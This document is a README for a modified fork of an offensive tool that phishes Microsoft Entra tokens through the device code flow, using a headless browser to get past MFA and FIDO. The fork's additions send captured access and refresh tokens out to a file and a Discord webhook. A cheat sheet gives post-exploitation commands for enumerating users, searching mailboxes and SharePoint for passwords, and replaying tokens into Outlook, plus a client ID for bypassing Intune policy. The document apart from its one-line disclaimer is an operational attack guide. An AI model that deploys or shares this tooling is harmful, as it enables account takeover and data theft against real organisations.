Original Project: https://github.com/denniskniep/DeviceCodePhishing
=====================================
## Changes Made to Original Code

### 1. Reduced Logging Noise
- Clean and minimal logging by default
- Shows only important events:
  - Server startup information
  - Initial polling message
  - Successful token captures
- All captured tokens are automatically logged to:
  - Console output (minimal format)
  - `tokens/tokens.txt` file (detailed format)
  - Discord webhook (if configured)

### 2. TLS Support
- Added flexible TLS configuration
- Can run in both HTTP and HTTPS modes
- Supports custom certificate paths
```bash
# HTTP Mode
./DeviceCodePhishing server -a 0.0.0.0:8080 -l login

# HTTPS Mode
./DeviceCodePhishing server -a 0.0.0.0:443 -l login --cert /path/to/cert.pem --key /path/to/key.pem
```

### 3. Token Logging
- All captured tokens are automatically saved to `tokens/tokens.txt`
- Includes timestamps and token types
- Format: `time=<timestamp> level=INFO msg="<token_type> for <user_code>: <token>"`
- Captures three token types:
  - Access Token
  - ID Token
  - Refresh Token

### 4. Discord Integration
- Real-time token notifications via Discord webhook
- Sends detailed token information in code blocks
- Format includes:
  - Token type
  - User code
  - Token length
  - Full token value
  - Timestamp
```bash
# Example with Discord webhook
./DeviceCodePhishing server -a 0.0.0.0:443 --discord-webhook "https://discord.com/api/webhooks/your/webhook/url"
```

### 5. Command Line Arguments
| Argument | Description | Default |
|----------|-------------|---------|
| `-a, --address` | Server listening address | `0.0.0.0:443` |
| `-l, --lure-path` | Path for the lure endpoint | `/lure` |
| `--cert` | Path to TLS certificate file | `""` |
| `--key` | Path to TLS private key file | `""` |
| `-u, --user-agent` | User-Agent for HeadlessBrowser | Edge on Windows |
| `-c, --client-id` | ClientId for requesting token | MS Auth Broker |
| `-t, --tenant` | Tenant for requesting token | `common` |
| `--discord-webhook` | Discord webhook URL for notifications | `""` |

## Running the Server

### Using Docker (Recommended)
```bash
# Build
docker build -t device-code-phishing .

# Run (HTTP)
docker run -p 8080:8080 device-code-phishing server -a 0.0.0.0:8080 -l login

# Run (HTTPS with Discord webhook)
docker run -p 443:443 \
  -v /path/to/cert.pem:/app/cert.pem \
  -v /path/to/key.pem:/app/key.pem \
  device-code-phishing \
  server -a 0.0.0.0:443 -l login \
  --cert /app/cert.pem \
  --key /app/key.pem \
  --discord-webhook "https://discord.com/api/webhooks/your/webhook/url"
```


##Cheat Sheet
```
powershell -ep bypass
Import-Module .\TokenTactics.psd1
$access_token = "eyJ0eXAiOiJ..."
Parse-JWTtoken $access_token
Import-Module AADInternals
Get-AADIntUsers -AccessToken $access_token
Get-AADIntUser -AccessToken $access_token -UserPrincipalName "admin@domain"
$refresh_token = "1.ASYAFR..."
RefreshTo-OutlookToken -domain domain.com -RefreshToken $refresh_token

Import-Module .\GraphRunner-main\GraphRunner.ps1
Invoke-RefreshGraphTokens -RefreshToken $refresh_token -tenantid domain.com //this will produce $tokens var
Get-Inbox -Tokens $tokens -userid user@domain.com -OutFile emails.csv
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "Password"
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password AND filetype:xlsx'
Invoke-GraphRecon -Tokens $tokens -PermissionEnum
Get-AzureADUsers -Tokens $tokens -OutFile users.txt
Get-SecurityGroups -AccessToken $tokens.access_token
Get-UpdatableGroups -Tokens $tokens
Get-SharePointSiteURLs -Tokens $tokens
Get-TenantID -Domain domain.com
Get-TeamsChannels -Tokens $tokens
Find-ChannelEmails -Tokens $tokens

To access https://outlook.office.com

POST /owa HTTP/1.1
Host: outlook.office.com
Content-Type: application/x-www-form-urlencoded

code=$Outlook_refresh_token
&id_token=$Outlook_access_token

If response is 302, copy response and open in browser.


to access Teams, must convert tokens with TokenTacticsV2 first
```
=====================================
# DeviceCodePhishing


## TL;DR;
This is a novel technique that leverages the well-known Device Code phishing approach. 
It dynamically initiates the flow as soon as the victim opens the phishing link and instantly redirects them to the authentication page.
A headless browser automates this by directly entering the generated Device Code into the webpage behind the scenes. 
This defeats the 10-minute token validity limitation and eliminates the need for the victim to manually perform these steps, elevating the efficiency of the attack to a new level.  
What makes Device Code phishing especially dangerous is its ability to bypass FIDO’s phishing protection. 
Additionally, the victim interacts with the original website they expect, making it impossible to detect the attack based on a suspicious URL.

## Demo
https://gist.github.com/user-attachments/assets/bf6d1c2d-7199-4394-824d-e6f57e8136a2

## Description 
DeviceCodePhishing is an advanced phishing tool, which leverages the Device Code Flow.
It can be used for phishing access-tokens, which in turn allows to bypass two-factor authentication protection, including accounts that exclusively use FIDO for authentication.

While other tools exist to automate device code phishing attacks, they often come with certain limitations, 
such as requiring the attacker to convince the victim to open the URL and enter the code within a strict 10-minute time frame.
The goal of this tool is to overcomes those limitations by automating the process with a headless browser, which initiates the attack 
as soon as the victim clicks on the phishing link.

This attack technique is even more dangerous than attacker-in-the-middle (AitM) proxies, because the
user **enters their credentials on the original webpage**, making it nearly impossible to detect the phishing attempt based on a suspicious URL.
Additionally, this technique can **bypass phishing-resistant FIDO** credentials!
In some cases, the user may not even need to enter credentials if a session is already active.

Currently, this tool is limited to targeting Microsoft Azure Entra users, but the underlying technique is not restricted to any specific vendor.

For more details, check out the blog post: [Phishing despite FIDO, leveraging a novel technique based on the Device Code Flow](https://denniskniep.github.io/posts/09-device-code-phishing)

## How it works
1. The attacker sends a URL to the victim
2. The victim opens that URL
3. When the URL is opened, a headless browser is started, performing the following automated steps:
   - Starts the Device Code Flow with `<tenant>` and `<clientId>`
   - Opens the device-code webpage and enters the corresponding user-code
   - The device-code webpage forwards to the URL for interactive authentication (By clicking on "Can't access your account" and immediately navigating back by clicking the cancel button, see [here](https://github.com/denniskniep/DeviceCodePhishing/blob/main/pkg/entra/devicecode.go#L101))
   - Returns the URL for interactive authentication as a redirect to the victim
4. The victim is redirected to the authentication URL
5. The victim completes the authentication
6. The attacker is authenticated

A demo video of the flow can be seen [here](#demo)  

## Install
Download appropriate binary from [Releases](https://github.com/denniskniep/DeviceCodePhishing/releases)
or install via go using following command:
```shell
go install github.com/denniskniep/DeviceCodePhishing@v1.0.0
```

## Start the phishing server

By default, it runs with tenant set to `common` and with the AuthenticationBroker ClientId `29d9ed98-a469-4536-ade2-f981bc1d605e`
```shell
DeviceCodePhishing server
```
Use the args if one want to define a specific tenant, a different clientId or a custom userAgent
```shell
DeviceCodePhishing server --tenant <tenantId> --client-id <clientId> --user-agent <userAgent> 
```
For further help on syntax or how to use arguments execute:
```shell
DeviceCodePhishing server --help
```

## Use
Open Url:
http://localhost:8080/lure


## Azure Entra ClientIds

| ClientId                             | Description                     |
|--------------------------------------|---------------------------------|
| 29d9ed98-a469-4536-ade2-f981bc1d605e | Microsoft Authentication Broker |
| 9ba1a5c7-f17a-4de9-a1f1-6178c8d51223 | Microsoft Intune Company Portal |

Hint: Use Microsoft Intune Company Portal for bypassing Intune compliant device Conditional Access Policy ([More Details](https://i.blackhat.com/EU-24/Presentations/EU-24-Chudo-Unveiling-the-Power-of-Intune-Leveraging-Intune-for-Breaking-Into-Your-Cloud-and-On-Premise.pdf))

## Next steps with obtained tokens
Once you have successfully obtained tokens, you can use them with other attack tools, such as:
* https://github.com/dafthack/GraphRunner
* https://github.com/f-bader/TokenTacticsV2?tab=readme-ov-file#azure-json-web-token-jwt-manipulation-toolset
* https://github.com/secureworks/family-of-client-ids-research


## Build it yourself 
```shell
go build main.go
```

```shell
./main server
```

## Run with Docker
```shell
docker run -p 8080:8080 ghcr.io/denniskniep/device-code-phishing:v1.0.0
```


## Build & Run it yourself with Docker
```shell
docker build . -t device-code-phishing
```

```shell
docker run -p 8080:8080 device-code-phishing
```

## Disclaimer
Provided as educational content only!
